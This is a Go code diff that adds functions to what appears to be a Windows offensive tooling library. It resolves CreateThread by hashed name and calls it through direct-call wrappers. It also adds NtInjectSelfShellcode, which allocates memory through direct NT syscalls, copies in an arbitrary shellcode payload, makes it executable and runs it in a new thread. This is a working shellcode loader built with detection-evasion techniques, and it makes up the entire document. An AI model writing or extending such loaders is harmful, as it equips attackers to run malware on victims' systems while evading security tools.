@@ -26,6 +26,12 @@ func DirectSyscallByHash(functionHash uint32, args ...uintptr) (uintptr, error) 
 	return syscall.HashSyscall(functionHash, args...)
 }
 
+// DirectCall executes a direct call to any Windows API function by address
+// This is different from DirectSyscall - it calls regular API functions, not syscalls
+func DirectCall(functionAddr uintptr, args ...uintptr) (uintptr, error) {
+	return syscall.DirectCall(functionAddr, args...)
+}
+
 // GetSyscallNumber returns the syscall number for a given function name
 // Useful for debugging or when you need the raw syscall number
 func GetSyscallNumber(functionName string) uint16 {
@@ -976,4 +982,121 @@ func (r *memoryReaderAt) ReadAt(p []byte, off int64) (n int, err error) {
 	}
 	return n, err
 }
+
+// CreateThreadDirect calls CreateThread from kernel32.dll directly using manual assembly call
+func CreateThreadDirect(startAddress uintptr, parameter uintptr) (uintptr, error) {
+	// Get kernel32.dll base address
+	kernel32Hash := obf.GetHash("kernel32.dll")
+	kernel32Base := syscallresolve.GetModuleBase(kernel32Hash)
+	if kernel32Base == 0 {
+		return 0, fmt.Errorf("failed to get kernel32.dll base address")
+	}
+	
+	// Get CreateThread function address
+	createThreadHash := obf.GetHash("CreateThread")
+	createThreadAddr := syscallresolve.GetFunctionAddress(kernel32Base, createThreadHash)
+	if createThreadAddr == 0 {
+		return 0, fmt.Errorf("failed to get CreateThread address")
+	}
+	
+	fmt.Printf("Found CreateThread at: 0x%X\n", createThreadAddr)
+	
+	// Call CreateThread directly using inline assembly approach
+	// CreateThread(NULL, 0, startAddress, parameter, 0, NULL)
+	var threadHandle uintptr
+	var threadId uintptr
+	
+	// Create a simple assembly call using the same pattern as syscalls
+	// We'll call the function address directly with the right parameters
+	result := callCreateThread(
+		createThreadAddr,
+		0,                                    // lpThreadAttributes (NULL)
+		0,                                    // dwStackSize (0 = default)
+		startAddress,                         // lpStartAddress
+		parameter,                            // lpParameter
+		0,                                    // dwCreationFlags (0 = run immediately)
+		uintptr(unsafe.Pointer(&threadId)),   // lpThreadId
+	)
+	
+	threadHandle = result
+	if threadHandle == 0 {
+		return 0, fmt.Errorf("CreateThread returned NULL handle")
+	}
+	
+	fmt.Printf("CreateThread successful - Handle: 0x%X, ThreadID: %d\n", threadHandle, threadId)
+	return threadHandle, nil
+}
+
+// callCreateThread performs the actual call to CreateThread using assembly
+// This uses DirectCall to call the function at the given address
+func callCreateThread(funcAddr, arg1, arg2, arg3, arg4, arg5, arg6 uintptr) uintptr {
+	// Use DirectCall to call the function address with proper Windows x64 calling convention
+	result, _ := DirectCall(funcAddr, arg1, arg2, arg3, arg4, arg5, arg6)
+	return result
+}
+
+// NtInjectSelfShellcode injects shellcode into the current process using direct syscalls
+// This function follows the proven pattern: allocate RW -> copy -> change to RX -> create thread
+func NtInjectSelfShellcode(payload []byte) error {
+	if len(payload) == 0 {
+		return fmt.Errorf("payload is empty")
+	}
+
+	currentProcess := ^uintptr(0) // Use pseudo-handle for current process
+
+	// Step 1: Allocate RW memory
+	var baseAddress uintptr
+	size := uintptr(len(payload))
+
+	status, err := NtAllocateVirtualMemory(
+		currentProcess,
+		&baseAddress,
+		0,
+		&size,
+		MEM_COMMIT|MEM_RESERVE,
+		PAGE_READWRITE,
+	)
+	if err != nil || status != STATUS_SUCCESS {
+		return fmt.Errorf("memory allocation failed: %v %s", err, FormatNTStatus(status))
+	}
+
+	// Step 2: Copy shellcode
+	copy((*[1 << 30]byte)(unsafe.Pointer(baseAddress))[:len(payload)], payload)
+
+	// Step 3: Change protection to RX
+	var oldProtect uintptr
+	status, err = NtProtectVirtualMemory(
+		currentProcess,
+		&baseAddress,
+		&size,
+		PAGE_EXECUTE_READ,
+		&oldProtect,
+	)
+	if err != nil || status != STATUS_SUCCESS {
+		return fmt.Errorf("protect failed: %v %s", err, FormatNTStatus(status))
+	}
+
+	// Step 4: Create thread using CreateThread instead of NtCreateThreadEx
+	hThread, err := CreateThreadDirect(baseAddress, 0)
+	if err != nil {
+		return fmt.Errorf("CreateThread failed: %v", err)
+	}
+
+	fmt.Printf("Self-injection thread created: 0x%X\n", hThread)
+	
+	// Wait for thread to complete execution and check exit code
+	fmt.Printf("Waiting for thread to complete...\n")
+	
+	// Wait for the thread with a timeout (5 seconds)
+	timeout := uint64(5000 * 1000 * 10) // 5 seconds in 100ns units
+	_, err = NtWaitForSingleObject(hThread, false, &timeout)
+	if err != nil {
+		return err
+	}
+	
+	time.Sleep(2 * time.Second)
+	NtClose(hThread)
+	return nil
+}
+
 
